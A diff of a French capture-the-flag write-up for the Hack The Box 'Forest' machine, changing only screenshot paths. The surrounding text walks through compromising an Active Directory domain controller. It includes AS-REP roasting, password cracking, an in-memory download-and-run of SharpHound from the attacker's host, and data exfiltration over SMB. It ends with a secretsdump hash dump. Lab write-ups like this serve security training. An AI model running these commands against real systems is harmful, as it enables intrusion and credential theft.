@@ -13,20 +13,20 @@ Nous commençons par l'énumération des services et ports de la box avec nmap :
 ```bash
 $ nmap -T4 -A 10.10.10.161
 ```
-![Pic2](../img/admirer2.PNG?raw=true) </br>
+![Pic2](../img/forest2.PNG?raw=true) </br>
 Plusieurs ports ouverts, on peut déjà tenter une énumération des dossiers partagés par SMB :
 ```bash
 $ smbmap -H 10.10.10.161
 ```
-![Pic3](../img/admirer3.PNG?raw=true) </br>
+![Pic3](../img/forest3.PNG?raw=true) </br>
 Aucun partage dispo.</br>
 On peut faire une énumération RPC avec rpcclient :
 ```bash
 $ rpcclient -U "" -N 10.10.10.161
 rpcclient > enumdomusers
 ```
-![Pic4](../img/admirer4.PNG?raw=true) </br>
-![Pic5](../img/admirer5.PNG?raw=true) </br>
+![Pic4](../img/forest4.PNG?raw=true) </br>
+![Pic5](../img/forest5.PNG?raw=true) </br>
 
 # Obtenir un accès utilisateur
 En ayant la liste des utilisateurs, nous pouvons tenter d'obtenir un ticket Kerberos pour chacun, cela fonctionnera que pour le compte
@@ -34,19 +34,19 @@ svc-alfresco :
 ```bash
 $ GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/svc-alfresco
 ```
-![Pic6](../img/admirer6.PNG?raw=true) </br>
+![Pic6](../img/forest6.PNG?raw=true) </br>
 
 Nous pouvons le cracker avec john :
 ```bash
 $ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-![Pic7](../img/admirer7.PNG?raw=true) </br>
+![Pic7](../img/forest7.PNG?raw=true) </br>
 Nous pouvons alors nous connecter via le port 5985 avec Evil-WinRM et lire le user.txt :
 ```bash
 $ evil-winrm -i 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
 > cat ../Desktop/user.txt
 ```
-![Pic8](../img/admirer8.PNG?raw=true) </br>
+![Pic8](../img/forest8.PNG?raw=true) </br>
 
 # Obtenir un accès administrateur
 Nous allons utiliser l'outil Bloodhound, pour ce faire, il faut :
@@ -68,7 +68,7 @@ Coté box :
 > iex(new-object net.webclient).downloadstring("http://10.10.14.34:8000/SharpHound.ps1")
 > dir
 ```
-![Pic9](../img/admirer9.PNG?raw=true) </br>
+![Pic9](../img/forest9.PNG?raw=true) </br>
 Nous pouvons voir le fichier 20201124130216_BloodHound.zip qui contient le résultat des données récoltées par SharpHound.
 
 ## Envoyé le résultat de SharpHound vers l'attaquant
@@ -76,7 +76,7 @@ Coté attaquant :
 ```bash
 $ smbserver.py share . -smb2support -username df -password df
 ```
-![Pic10](../img/admirer11.PNG?raw=true) </br>
+![Pic10](../img/forest11.PNG?raw=true) </br>
 Coté box :
 ```bash
 > net use \\10.10.14.34\share /u:df df
@@ -84,7 +84,7 @@ Coté box :
 > del 20201124130216_BloodHound.zip
 > net use /d \\10.10.14.34\share
 ```
-![Pic11](../img/admirer10.PNG?raw=true) </br>
+![Pic11](../img/forest10.PNG?raw=true) </br>
 
 ## Charger le résultat dans Bloodhound
 On lance neo4j et bloodhound :
@@ -94,11 +94,11 @@ $ bloodhound
 ```
 </br>
 Maintenant nous importons les données dans bloodhound :</br>
-![Pic12](../img/admirer12.PNG?raw=true) </br>
+![Pic12](../img/forest12.PNG?raw=true) </br>
 Une fois finit, on va faire une recherche pour trouver le chemin le plus court vers l'administrateur du domaine :</br>
-![Pic13](../img/admirer13.PNG?raw=true) </br>
+![Pic13](../img/forest13.PNG?raw=true) </br>
 Nous avons alors un résultat graphique très sympa :</br>
-![Pic14](../img/admirer14.PNG?raw=true) </br>
+![Pic14](../img/forest14.PNG?raw=true) </br>
 Il faut savoir, que sur chaque arête se trouve un élément (Member of / contain / Genericall ..) et si on clique droit sur cet élément
 et que l'on clique sur Help, Bloodhound nous donne un descriptif très complet. Dans notre cas, on a GenericAll et WriteDacl qui, dans l'help, ont une rubrique "Abuse Info" pour 
 expliquer en détail comment epxloiter l'élément.
@@ -128,4 +128,4 @@ Evil-winRM > Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Mem
 ```bash
 $ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
 ```
-![Pic15](../img/admirer15.PNG?raw=true) </br>
+![Pic15](../img/forest15.PNG?raw=true) </br>
